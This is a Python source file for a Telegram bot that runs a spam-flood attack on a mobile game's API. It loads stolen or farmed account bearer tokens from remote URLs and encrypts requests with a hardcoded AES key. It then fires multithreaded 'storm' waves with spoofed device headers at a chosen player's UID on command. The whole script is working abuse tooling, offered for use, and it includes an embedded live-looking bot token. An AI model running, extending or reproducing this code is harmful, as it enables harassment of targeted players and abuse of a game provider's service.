import requests
import threading
import time
import random
import hashlib
import json

import requests
import threading
import time
import random
import hashlib
import json
import os
import asyncio
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes


class AdvancedAttackSystem:
    def __init__(self):
        self.tokens = []
  
        
        
        
        
        self.api_urls = [
            "https://r1-acc-jwt.vercel.app/da2fb4283d224ec49f6e2072296d167cc1bcfecbae66a9d60eb07c647ee24dc0",
            "https://r1-acc-jwt.vercel.app/cf2eb34514e1bc49fafec897f12b4e34f8737c531ecb9b52a8220bcfe09f9498",
            "https://r1-acc-jwt.vercel.app/353ee7b93ba278c9844d804369ec206b2a9c64753233f07d82213b0875523667",
            "https://r1-acc-jwt.vercel.app/a988516deeb304d7b49b80a7eddc5862d6d5438608feaf13773be6c40c3d96c3",
            "https://r1-acc-jwt.vercel.app/0357e991c1648c9e8cea39b83dc6624270a7eba0e2a773e7748f5bf36ed9f976",
            "https://r1-acc-jwt.vercel.app/c86b4decb16a297e3d94aefaa0d1451d0a499f8d8b91e8b5107c9d6743eebbe3",
            "https://r1-acc-jwt.vercel.app/c24ab125d68c76903cde61af6576b1089462c62e4f6ca61e43daa8d838be7d5f",
            "https://r1-acc-jwt.vercel.app/04f2e516049a10e4694c2d90528e7f8141227d4a96de850eb170e6b65b27daf5"
        
        
        ]
        self.load_tokens_auto( )

    def load_tokens_auto(self):
        print("--- Loading Tokens ---")
        for url in self.api_urls:
            try:
                response = requests.get(url, timeout=10)
                if response.status_code == 200:
                    token_data = response.json()
                    if token_data.get("success") is True and "BearerAuth" in token_data:
                        self.tokens.append(token_data["BearerAuth"])
                        print(f"  [SUCCESS] Loaded token!")
                else:
                    print(f"  [FAIL] Status {response.status_code} for {url}")
            except Exception as e:
                print(f"  [ERROR] Exception for {url}: {e}")
        print(f"--- Total Tokens Loaded: {len(self.tokens)} ---\n")


    def get_random_token(self):
        return random.choice(self.tokens) if self.tokens else None

    def encrypt_id(self, number):
        number = int(number)
        encoded_bytes = []
        while True:
            byte = number & 0x7F
            number >>= 7
            if number: byte |= 0x80
            encoded_bytes.append(byte)
            if not number: break
        return bytes(encoded_bytes).hex()

    def encrypt_api(self, plain_text):
        plain_text = bytes.fromhex(plain_text)
        key = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
        iv = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return cipher.encrypt(pad(plain_text, AES.block_size)).hex()

    def send_request(self, session, target_id, token):
        try:
            iddd = "0a" + self.encrypt_id(len(target_id) // 2) + self.encrypt_id(target_id)
            encrypted_data = self.encrypt_api(iddd)
            headers = {
                "Content-Type": "application/x-www-form-urlencoded", "X-GA": "v1 1", "ReleaseVersion": "OB51",
                "Host": "clientbp.ggwhitehawk.com", "Accept-Encoding": "gzip",
                "User-Agent": f"Dalvik/2.1.0 (Linux; U; Android {random.randint(9, 13)}; SM-G9{random.randint(8,9)}N Build/TP1A.220624.014)",
                "Connection": "keep-alive", "Authorization": f"Bearer {token}", "X-Unity-Version": "2018.4.11f1",
                "X-Device-ID": hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
                "X-Platform": "android", "X-App-Version": str(random.randint(100000, 999999))
            }
            session.post("https://clientbp.ggwhitehawk.com/NotifyVeteranFriendOnline", headers=headers, data=bytes.fromhex(encrypted_data ), timeout=2)
        except Exception:
            pass

    def wave_worker(self, target_id, stop_event, tokens_for_wave):
        session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(pool_connections=50, pool_maxsize=50)
        session.mount('https://', adapter )
        
        while not stop_event.is_set():
            
            pulse_end_time = time.time() + 3 
            while time.time() < pulse_end_time and not stop_event.is_set():
                token = random.choice(tokens_for_wave)
                self.send_request(session, target_id, token)
                time.sleep(0.01) 
            
            
            if not stop_event.is_set():
                time.sleep(0.1) 

    def start_storm_attack(self, target_id, num_waves=5):
        if not self.tokens:
            return None, None

        stop_event = threading.Event()
        all_threads = []
        
        
        tokens_per_wave = max(1, len(self.tokens) // num_waves)
        wave_token_sets = [self.tokens[i:i + tokens_per_wave] for i in range(0, len(self.tokens), tokens_per_wave)]

        print(f"Unleashing the storm: {num_waves} waves, {len(self.tokens)} total accounts.")

        for i, token_set in enumerate(wave_token_sets):
            if not token_set: continue
            
            
            wave_thread = threading.Thread(target=self.wave_worker, args=(target_id, stop_event, token_set), daemon=True)
            all_threads.append(wave_thread)
            wave_thread.start()
            print(f"  -> Wave {i+1} launched...")
            time.sleep(0.1) 

        return stop_event, all_threads

class TelegramAttackBot:
    def __init__(self, token):
        self.attack_system = AdvancedAttackSystem()
        self.active_attacks = {}
        self.app = Application.builder().token(token).build()
        self.setup_handlers()

    def setup_handlers(self):
        self.app.add_handler(CommandHandler("dm", self.dm))
        self.app.add_handler(CommandHandler("remove", self.remove_attack))

    async def dm(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not context.args:
            await update.message.reply_text("Usage: /dm UID")
            return
        
        target_id = context.args[0]
        if not self.attack_system.tokens:
            await update.message.reply_text("خطأ: لم يتم تحميل أي حسابات. لا يمكن بدء الهجوم.")
            return
        
        if target_id in self.active_attacks:
            await update.message.reply_text(f"المقبرة مستمرة بالفعل على: {target_id}")
            return
        
        
        
        num_waves = min(len(self.attack_system.tokens), 200) 
        stop_event, threads = self.attack_system.start_storm_attack(target_id, num_waves=num_waves)
        
        if not threads:
            await update.message.reply_text("فشل في بدء الهجوم.")
            return

        self.active_attacks[target_id] = {"stop_event": stop_event, "threads": threads}
        await update.message.reply_text(f"done {len(threads)} {target_id}")

    async def remove_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not context.args:
            await update.message.reply_text("Usage: /remove UID")
            return
        
        target_id = context.args[0]
        if target_id in self.active_attacks:
            print(f"Stopping attack on {target_id}...")
            self.active_attacks[target_id]["stop_event"].set()
            for thread in self.active_attacks[target_id]["threads"]:
                thread.join(timeout=2)
            
            del self.active_attacks[target_id]
            await update.message.reply_text(f"stop for {target_id}")
            print("Attack stopped.")
        else:
            await update.message.reply_text(f"لا يوجد هجوم فعال على {target_id}")

    def run(self):
        if not self.attack_system.tokens:
            print("CRITICAL: No tokens loaded. Bot will start but cannot attack.")
        print("Bot is running...")
        self.app.run_polling()

if __name__ == "__main__":
    BOT_TOKEN = "8472861370:AAF6QJZV8_R6GRpBq5ziQzvxYqX4WWDPC-E"
    
    if not BOT_TOKEN or "YOUR_TOKEN" in BOT_TOKEN:
        print("Error: Please set your Telegram bot token in the script.")
    else:
        try:
            
            bot = TelegramAttackBot(BOT_TOKEN)
            bot.run()
        except Exception as e:
            print(f"An error occurred during startup: {e}")
